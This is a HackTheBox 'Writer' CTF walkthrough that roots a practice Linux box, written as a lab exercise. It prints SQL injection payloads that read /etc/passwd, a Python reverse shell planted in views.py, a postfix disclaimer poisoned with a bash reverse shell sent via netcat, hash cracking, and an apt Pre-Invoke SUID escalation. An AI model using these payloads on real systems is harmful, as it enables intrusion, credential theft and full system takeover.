@@ -1,0 +1,126 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Writer HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/writer-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-01-19T12:47:12+00:00">January 19, 2022</time><time class="updated" datetime="2025-06-20T12:15:50+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Writer is a CTF Linux box with difficulty rated as “medium” on the HackTheBox platform. The machine covers SQL injection vulnerability and privilege escalation using SMTP.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Directory enumeration to find admin page</span></li>
+<li><span style="color: #000000;">Detecting SQL injection on the login page</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting UNION based SQLi to get essential information about python based webserver</span></li>
+<li><span style="color: #000000;">Fetching internal files using SQL injection to compromise credentials of a user</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Escalating from www-data to Kyle by cracking hashes in the database</span></li>
+<li><span style="color: #000000;">Escalating from Kyle to John by poisoning postfix/disclaimer file</span></li>
+<li><span style="color: #000000;">Escalating from John to root by exploiting apt-get</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The dedicated IP address of the machine is <strong>10.10.91.172. </strong>We’ll run a nmap scan on this machine’s IP.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.170.230</pre>
+<p><span style="color: #000000;">Open ports were:</span></p>
+<ul>
+<li><span style="color: #000000;">22 running SSH</span></li>
+<li><span style="color: #000000;">80 running a website</span></li>
+<li><span style="color: #000000;">139 running netbios</span></li>
+<li><span style="color: #000000;">445 running SMB service</span></li>
+</ul>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjwcPoODKo9X2F3lKbKJuyLKwiwtikY4u_AOkFxlNgyPp95g_ZnLom-7FRyDso-xyWgFL29SY1ENS5OAEbQuqrnapq6PEkmnfu2aehE0WHRZq_6L8CIimNGTTKgVdVqD1f2PtSye4QXdZmxCeGzVUq36bN2GgJGRJcHpLhAdo04e0gXDl5HyVYcpKHGKw=s16000"/></strong></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">There was a website running on port 80</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhZW6-lh4_yJUs_tqUejXFgkX44sA96_Uia1ueeKf1vW4XGeeCOCrD1Gn-TqgUBVM-DmHbyBuyfJeX_ON_0VM6Wn-W2TnAWMXBRb6XAW0Z-mIAy4dtbXmzU575p30IdzlU8cP4Tx_blsgnTQeN-BQRdoZBJBcN4poXJnA_ie26pFbNELBQmR9olr7RbUw=s16000"/></span></p>
+<p><span style="color: #000000;">So, we enumerated the directories using gobuster and seclists medium wordlist</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir -w /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</pre>
+<p><span style="color: #000000;">We found an interesting directory called administrative</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjuMNqJfpVBFC2x3uC3jlN0s_cftWRjMImp5dqCkmgg5FzjtY_PwLpRHbPPLv6VHX0yXLWy0aMPS-DorNcyqwIOts-WHlUerGLpM88eP-YCEwmzxg1zYM1OlX_ftx7UoCUmBdnTB1u7_vdDyp46fK_qLHLgm8bsPjsTr5k5ZjCCEbpY-EW2OsPOLreTbQ=s16000"/></span></p>
+<p><span style="color: #000000;">This page seemed to be hosting a login panel</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjkD1q4uVHCCSuQvDFSnTPMPVwvDJnU3ELoCR8RCtOApnKUydCTMImcJOXuzJiX4lq7jqfeL0lyvqp1Pb8u0TGu1B6rL3KnBQfJqYADOvtzTdwypgSO34kpBo93nAaKfORYj444OHMT3CaZF5EyYIO3VbqNmXW_sasSMhu9vkvJqi0nodMrsXly595H4g=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Right away we tried logging in using SQL injection payload</span></p>
+<p><span style="color: #000000;">username: ‘ or 1=1 —</span><br/>
+<span style="color: #000000;">password: ‘ or 1=1 —</span></p>
+<p><span style="color: #000000;">And we got logged in!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjH_DRrcI3ZpXKdUL0krUYdW72Eq82I5aCvu2x3HdXdhz6IvbwxOB0uaKLqtfuRYO9F-XNjuR7x6njl0FjWwy5C2FZVHdH2YzP8kaFCepQmHXBj9LdaBrNdhCAhAizNHpVQhT2VEnVVANuzG39Yh-ZUfhSX-SyJJIiAL8YlWtvQZKLHOviEMegj3D6woA=s16000"/></span></p>
+<p><span style="color: #000000;">However, upon observing the request in Burpsuite repeater and using a UNION based SQLi payload, we noticed that the response reflected the second column in the active table.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname=admin' union select 1,2,3,4,5,6 -- &amp;password=admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiAV7NQ9lBpTfOjvTZwgfWlcw1U4LJUdSee7wLhPDWAoMvE3XZ4fpPyOP4ZbZi7rzZXb4ZuBlFfpnoIOzxPLQWKWr2ZB0BkxrNj5O9APETz0w7V0NfTTNAQx9oFGl6ue0AIo1zWdx584pD42nuOgUEvTJcBnhuMAoR_WE3y9NPl0d_IQoiLyZTtStyqrw=s16000"/></span></p>
+<p><span style="color: #000000;">We can see the active database’s name by changing the second column by the database() in the payload. As you can see, the active database is “writer”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname=admin' union select 1,database(),3,4,5,6 -- &amp;password=admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiU6cl5ly1H1bBaaP0HoyGFu3GFqoz3DtI72GHi9P8iDp1ag0G6-1igZNyJp99vKdZlY-wEtFsGS1fOxUXS3hpczUy-ZPBqnkChDtoc58mtclrv-krXIKEna-s0gDTlgPFxEgegXEOGylHRg3RigB3FdpWvzexgfdFmU950wVQ4nApaYbl1y1kKaP5tTA=s16000"/></span></p>
+<p><span style="color: #000000;">Similarly, we can read the /etc/passwd file and try to learn what all users exist.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname=admin' union select 1,load_file("/etc/passwd"),3,4,5,6 -- &amp;password=admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiAyDpDEVcaXev2FIWhSSxrb6ZULX5txypAqQ2rhCQWnI3RZPxxIU8eN65TnY8NMHUqNnPsx6aHox-VOqYd23zwePKVP35jqjIWY05GlDp5rY8IF1730Fj97XordtHyJxqY1tbllL7V4aEAryqkfSTQbNEP-fI4BrPXMoDcHperohGCl04tRTezsZK2ow=s16000"/></span></p>
+<p><span style="color: #000000;">This gave us an insight into the system. It of course was running Apache webserver so we looked at 000-default.conf file that includes the absolute path of the website. Here, we found a wsgi present which means that a python based webserver (Django or Flask) was running on the webserver.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname=admin' union select 1,load_file("/etc/apache2/sites-enabled/000-default.conf"),3,4,5,6 -- &amp;password=admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiuo-EYZ_zsieHUM9FNmErANzTfDO4Qkx1hxkpP6i31SiWh3zpLNQdlFhqBhjEP_L9CQsQPc3Ufyc7dJN6714DJFlO09eD8gOvIW0Gmch4LqSIE-y3KMVQTPbE1TqkTb2Uwqc6AuMbTDI_pst0ROubLfvWfOyWtKpmEGzQsihvzgwP2LjqyA6o-oSW9bw=s16000"/></span></p>
+<p><span style="color: #000000;">Then we tried to read this wsgi file as it includes functions that the server uses to communicate with the application. So we read this file and found that init.py imported it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg2T7W2aOvMmvEgxUj5SFG5R7gazEJaXNZVQq-83Grx5f9RgEaHZtIEVa3qGZys8jEF3I5y-kgKhHGhm-d-3Q_OxEpaJonXPF5-VMTDOoUQlIvHSQBfwnItpl425_mOtayq84ho9p3xQj76TWZBLhzi1g3QbZ5m4QD2PquAha1miY9kbYTZpQkfaSODjw=s16000"/></span></p>
+<p><span style="color: #000000;">So, we decided to read __init__.py file and found a credential!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjgJlUziMEmq7cbz4yY0N_gfilc0Q6hHyiSFwhwRyAStVyfU7E1U3tx8TW3_wZcv-ljVKy_6590H_qa-IqJtCyHU7XoTMqKkE5oc9oPbufqZHdMW0vqLRbq0J3Z_3KDAPCRbO6PsFqbWqmpqtnnSDc2-D2fTmfvWndBIgdCPs1OVatGgAoAjipRFeuRgA=s16000"/></span></p>
+<p><span style="color: #000000;">From the knowledge of /etc/passwd that we dumped earlier, we know there exists a finite number of users on the system. Out of those, Kyle seemed to react to this password when we connected to the SMB share. When we logged on to the share we saw the Python server’s files on there. One such file on Django or Flask is the “views.py” file. Views hold the logic that is required to return information as a response in whatever form to the user. This logic is held in the file “views.py”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbmap -H 10.129.170.230 -u "kyle" -p "ToughPasswordToCrack"
+smbclient //10.129.170.230/writer2_project -U 'kyle%ToughPasswordToCrack'
+cd writer_web
+get views.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiLNZ2KoP621-LYKBscYWircW9uAs3gq2AYY1V5S0JH5_MML_aSrWe1zCNpDIQp8hESp4ajefacrvaophZTEiA0yHjiixufGmG1xmPFAZvYJGzIoSwYumFtyDxqLI8p7WnxxOgrzoo-O2NR7gB8NA6My2pC7eGO4XqVNwmmXFNwrSGP13-etvUHGB1N5w=s16000"/></span></p>
+<p><span style="color: #000000;">Logically, the website should render whatever is in views.py. Hence, if we add a simple python one-liner, the website would render it too. That’s precisely what we did. We added the following code in views.py</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import os
+os.system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.104/1234 0&gt;&amp;1"')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiqoTz-nxKnLTm5okqOMeVDFMKwZ49jbbsbdpwQEVTIkvbP37pZKVwIwtjHlkMmrMiK8038JsLGqbVGYja70DHhauAkU_FgWuXgmXGgJeN6qWiKzxyzNvUsagxqFDxg6dTfuysZhn1gxW4n3p62aGS1GbhYnIm_b3inoaKJLYQcz7vvRZnM6D0PKakt6w=s16000"/></span></p>
+<p><span style="color: #000000;">Thereafter, we replaced this views.py with the original one using put command in the SMB share</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh0_VLcenClOlfAu8uLake4mMOZKnmVfsfHKIW8B8pKevzk0p2mfIU8a1fpePhIHY6AC7t35FcCNHK-FzdbWKdTtgHH-UrsNZm-CuXtyTuYh1B_Zz7PftRazpcdPRtGMhiimJCdG_ErO6bhj6nqnU-m8ouRmbSjQORLU9JJewLCGWinZ1oiZ5hhHDLstQ=s16000"/></span></p>
+<p><span style="color: #000000;">We set up a listener side by side and gave the website a refresh. We had received a reverse shell!</span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">The manage.py file in Django is used to communicate with a website’s files and perform functions such as run a server and migrating changes. However, <strong>dbshell </strong>command is used to communicate with the website’s database. So after a bit of exploring we found a hashed credential in the auth_user table.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 manage.py dbshell
+show tables;
+select * from auth_user;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiso-v7dWgQtmqMM7EEckAJZqHkukPP2Z2qVmPRgC3yRi95P_SR6sDg4dJmFRHxDnfJSi4QGz2uMtUSvamo3o1yHKXvs1e_ZtyNNMCb1BB266wzZZMf4nad79RM-KWEYN4H3xxcQmPlgas80XSeUVrFXcMWd73eUq_JNZVeiP1pGa2ov2kPhQ9WFud_NQ=s16000"/></span></p>
+<p><span style="color: #000000;">We took this cred and ran it with hashcat using rockyou.txt wordlist</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 10000 hash rockyou.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhiLXTQSXcgl0zpDJhjlqU8v1-d8_jU_eTPnptq71mfht79bTrETtEHGxelXQjLAuIGVIVcJHrMqi9R1cTOgSap8jruwEZtjdCyPZX02tVcHqm2QER89t01XaVegKyeGXfc1uJL3HOABr0jSAbYXPdLJainKNRcZ4LbsbOidmceBZb6cN90LEq9WuPM-A=s16000"/></span></p>
+<h5><span style="color: #000000;">The password came out to be: <strong>marcoantonio</strong></span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh77-2_K1eN7xonssoj6IgIIRmeOEkbOgFe-q2ta5JuZradaXYGC6Ih2n2ew5qpEr8hAZQILtMyHrT-xC2YLHUy9gMG42zddPDM6zK8MOs9klp6jA0xvT6U80d4ha-uSNB8nNIyPs9BistgHdDB45IOlsfBIF2zgYmuG0F3ZbGMgD_JIhOGc2JJvS-9vA=s16000"/></span></p>
+<p><span style="color: #000000;">I SSHed into Kyle using this password and also observed that Kyle is a part of filter group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGPC_s6uue_zuHBgATgAjsZKbSMOK3L0B7dpTYSPLm_XJBp6Km4unxKaSMbMOGDTByFeh2xSqH3o7QfMFCfGArAA7uHuOFChz7rnzVms0ydk3sR19qBT5-gfV7Xd051psab1nH3ZyLpz7-KhjDFnRg_4SCv78_35P7X5OpZHOBbOFieJb7F3P16amRtg=s16000"/></span></p>
+<p><span style="color: #000000;">Then, we included all the files in this filter group and noted the /etc/postfix/disclaimer file, which automatically adds a disclaimer at the end of an e-mail.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -group filter 2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgoG6xZqedvffARJwAj_Wc45pGGiWDFRQj0sZmlfH5UdvulIGuEUKkY0vG6Ig8kks5axeVMG129m4Py8kCU9vPu6lmFFi7d5X-jd02T0SJ-6ly6IEfcDBKkl9kZF0tvFPfP-wB6iIReWehXE-svkgtQ-Wkpmcj4XHfITMNHlCSL_t2xRwN9-75hwHjTFg=s16000"/></span></p>
+<p><span style="color: #000000;">Then, since we would automatically add this disclaimer to every e-mail, we can overwrite this file with our reverse bash code and send a simple testing e-mail to john using netcat. The following payload does the said thing.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.14.104/5555 0&gt;&amp;1'" &gt; /etc/postfix/disclaimer &amp;&amp; echo -e "HELO writer.htb\nMail From:kyle@writer.htb\nRCPT To: john@writer.htb\nData\nTo: john@writer.htb\nFrom: kyle@writer.htb\nSubject: Testing\nTesting\n." | nc localhost 25</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjMMaZjzX0qbhvhAsS9CNYlaW5zpKoKeM2ULUHTICgGDyu0CsrxLWl0ilmwZ0hcsAJz-8ZM3-PVmsFVOLpCN7-tyiWPq8YPDVrybxArz00A13U6ogUCzKonKMqhg2DGk3-CqVREDwPzcXZimxlm8rNN0aJFOngkTkqyv_TwRRVLarodGB-mCpQ-EKvllQ=s16000"/></span></p>
+<p><span style="color: #000000;">And on our listener set up on port 5555, we see user john’s shell! We just wanted to get a more stable shell so we copied the private SSH key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEilYM5UYtNGV60X0YafkpYlpml5Nc3gv10zws5-8oppAReyokTKqf_uzc6EL2zfijDTmxROQGzpXd0LFugPZ71XRX9tH6-_fIuZ0B75TP3yjjXe6pQjqd_t6U7pnL7gVoEjnsL228K2oUceILaFzj326SKrvCS1yEMSPRGaZeN5BRHmhb4Zuls9O3Blng=s16000"/></span></p>
+<p><span style="color: #000000;">I SSHed into the John and changed the permissions to 0600. John belonged to a group known as management, as we saw. We examine the other files that belong to this category. We observed the apt.conf.d directory, which is a management component. Furthermore, this belongs to the apt-get package management and is held by root!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 key
+ssh -i key john@10.129.170.230
+id
+find / -group management 2&gt;/dev/null
+ls -la /etc/apt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg7xEH-y6JRgr8ayapkhzDP4etXTljKn2z5md3MCWn2mbFQQ6Me79UJVYkt1oTxGarVEwiTfzys3FyszgvhYWGjKPdi3xM-2eC_KJNQY_kVM62LmCDwhRzB_fyq-fqjfo4ltbQPIi_FO3buOPHzNrtgpM4Anj8E_3RMl39r1SAL1oy6JLz8RoCUtBHitQ=s16000"/></span></p>
+<p><span style="color: #000000;">Upon inspecting a bit more, we found that apt-get was running as a cron job. Hence, we will follow our article <a style="color: #000000;" href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">here</a> and use apt-get to escalate ourselves to root. The payload that we are using inside Pre-Invoke is this: <strong>/bin/bash -c chmod 4777 /bin/bash</strong></span></p>
+<p><span style="color: #000000;">However, we have encoded it in base64 as it wasn’t working in cleartext.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICJjaG1vZCA0Nzc3IC9iaW4vYmFzaCIK | base64 -d | bash"};' &gt; /etc/apt/apt.conf.d/000-shell
+ls -la /bin/bash</pre>
+<p><span style="color: #000000;">You can see that bash has a SUID bit set now! We’ll just launch it using -p option now and read the congratulatory flag as we are now root!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/bin/bash -p</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj9tRr8q_bS_gk5HFIcKJtJgDHAN16ZGzONAwQyr7RFr95dtZ4iqNzDwNLqgZT7lhMmzhuGqxIlTfbBAXE9aCgufdOAVAsU25_k0PpxbS2VKtghMpIsy1b-9C6Iwc9p6eulPCQ1EequVPDIjZ2cfAYhlugYtGXi96chWsTVu4PH8nMhKUPPmTKVGq1X5w=s16000"/></span></p>
+<p><span style="color: #000000;">Hence, this is how we rooted the box writer. Hope you enjoyed our approach. Thanks for reading!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
